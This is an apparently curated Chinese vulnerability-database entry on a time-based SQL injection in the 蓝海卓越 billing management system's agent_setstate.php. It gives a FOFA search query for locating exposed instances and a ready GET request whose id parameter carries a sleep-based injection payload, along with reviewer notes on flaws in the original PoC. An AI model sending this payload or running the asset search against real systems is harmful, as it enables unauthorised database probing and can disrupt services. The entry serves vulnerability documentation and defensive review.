---
source: "wy876 漏洞文库"
title: "蓝海卓越计费管理系统 agent_setstate id条件时间SQL 注入"
product: "蓝海卓越计费管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，MySQL，数据库名长度6条件"
prerequisites: "未说明"
side_effects: "延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lgkwcrdalag9xge0"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fagent_setstat%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "title==\"蓝海卓越计费管理系统\""
fofa_unverified: "title=="
id: "vw-66cad293a92fb372d85851ba"
entity_id: "ve-66cad293a92fb372d85851ba"
schema_version: "1"
---

# 蓝海卓越计费管理系统 agent_setstate id条件时间SQL 注入

## 条目说明

- 对象与具体问题：蓝海卓越计费管理系统；agent_setstate id条件时间SQLi
- 版本、配置及部署条件：未知版本，MySQL，数据库名长度6条件
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题agent_setstat与实际agent_setstate.php不一致
- 只有数据库名长度为6才sleep3，作为通用检测有假阴性；缺基线与布尔对照
- GET声明Content-Length161但无请求体；接口改变代理状态风险需说明
- 无结果/修复范围

## 操作风险

延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
蓝海卓越计费管理系统agent_setstat存在SQL注入漏洞

## 二、影响版本
+ 蓝海卓越 计费管理系统

## 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征


## 四、漏洞复现
```http
GET /agent_setstate.php?id=1+AND+(SELECT+4964+FROM+(SELECT(if(length(database())=6,sleep(3),1)))uQqn) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Content-Length: 161
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lgkwcrdalag9xge0>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
